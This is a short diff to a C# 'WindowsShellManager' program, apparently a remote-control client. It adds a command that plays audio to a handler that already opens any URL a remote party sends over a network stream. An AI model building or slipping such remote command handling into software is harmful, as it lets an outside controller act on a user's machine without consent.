@@ -65,6 +65,11 @@ namespace WindowsShellManager
                         {
                             System.Diagnostics.Process.Start("http://" + command[1]);
                         }
+                        else if (command[0] == "PLAYAUDIO")
+                        {
+                            Console.WriteLine("PLAYAUDIO");
+                            Helpers.helper.PlaySoud(command[1]);
+                        }
                         else if (decodedData.ToUpper() == "DISCONNECT")
                         {
                             stream.Close();
@@ -91,6 +96,7 @@ namespace WindowsShellManager
                 }
             }
         }
+
         void SendData(NetworkStream stream, byte[] data)
         {
             byte[] dataLength = BitConverter.GetBytes(data.Length);
